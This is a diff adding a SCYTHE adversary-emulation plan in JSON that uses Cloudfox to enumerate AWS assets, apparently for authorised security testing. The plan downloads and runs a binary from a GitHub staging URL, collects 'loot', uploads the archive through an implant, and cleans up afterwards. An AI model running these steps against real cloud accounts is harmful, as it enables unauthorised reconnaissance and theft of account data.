@@ -1,0 +1,125 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "Steps to demonstrate use of Cloudfox to enumerate AWS assets.",
+        "display_name": "Cloudfox",
+        "name": "Cloudfox",
+        "operating_system_name": "linux",
+        "script": {
+            "0": {
+                "conf": "--cp 127.0.0.1:443 --multipart 10240 --secure true",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "name": "Instructions",
+                "type": "assign",
+                "value": "This campaign must be run on a system with an AWS IAM role attached. The results are dependent on both your AWS environment and the permissions with the IAM role attached to the instance.  If you run on multiple different systems in the same AWS deployment, you may get different results due to different IAM roles attached to different EC2 instances. The tool will be downloaded to the directory in WORKING_DIR. Cloudfox creates a profile directory of .cloudfox in the home directory of the user who runs it containing logs (not output). By default, we delete this directory. The WORKING_DIR will be deleted at the conclusion of the emulation."
+            },
+            "2": {
+                "name": "CRITICALLY_IMPORTANT",
+                "type": "assign",
+                "value": "You MUST run this on an instance with IAM roles configured or under an account with AWS credentials configured. Please ensure that you can run the command \"aws s3 ls\" from the same system and account your are running the SCYTHE implant from and include the output from the command with any support tickets submitted related to this plan."
+            },
+            "3": {
+                "name": "WORKING_DIR",
+                "type": "assign",
+                "value": "/tmp/cloudfox"
+            },
+            "4": {
+                "name": "CloudFoxCommand",
+                "type": "assign",
+                "value": "all-checks"
+            },
+            "5": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "6": {
+                "module": "loader",
+                "module_to_load": "uploader",
+                "request": "--load uploader",
+                "type": "message"
+            },
+            "7": {
+                "module": "loader",
+                "module_to_load": "downloader",
+                "request": "--load downloader",
+                "type": "message"
+            },
+            "8": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "mkdir -p $(3).response",
+                "type": "message"
+            },
+            "9": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cd $(3).response; wget https://github.com/scythe-jake/staging/blob/main/cloudfox.gz?raw=true -O cloudfox.gz; gunzip cloudfox.gz; chmod 700 cloudfox",
+                "type": "message"
+            },
+            "10": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cd $(3).response; ./cloudfox aws $(4).response",
+                "type": "message"
+            },
+            "11": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cd $(3).response; tar -czf cloudfox-output.tgz cloudfox-output cloudfox-logs",
+                "type": "message"
+            },
+            "12": {
+                "depends_on": "80a402f2-e448-4818-ab8f-2047a033faea",
+                "module": "uploader",
+                "request": "--remotepath $(3).response/cloudfox-output.tgz",
+                "type": "message"
+            },
+            "13": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "rm -f $(3).response/cloudfox-output.tgz",
+                "type": "message"
+            },
+            "14": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "Cat out loot values to put in the report"
+            },
+            "15": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cd $(3).response/cloudfox-output/aws/*/loot; echo LOOT; echo ====;echo; for i in *; do echo ==== ====================================;echo $i; echo ========================================; cat $i; echo; echo; done",
+                "type": "message"
+            },
+            "16": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "Cat out table output to put it in the SCYTHE report."
+            },
+            "17": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cd $(3).response/cloudfox-output/aws/*/table; echo TABLES; echo ======;echo; for i in *; do echo ==== ====================================;echo $i; echo ========================================; cat $i; echo; echo; done",
+                "type": "message"
+            },
+            "18": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "Cleanup"
+            },
+            "19": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "rm -rf $(3).response",
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29",
+        "tags": []
+    }
+}
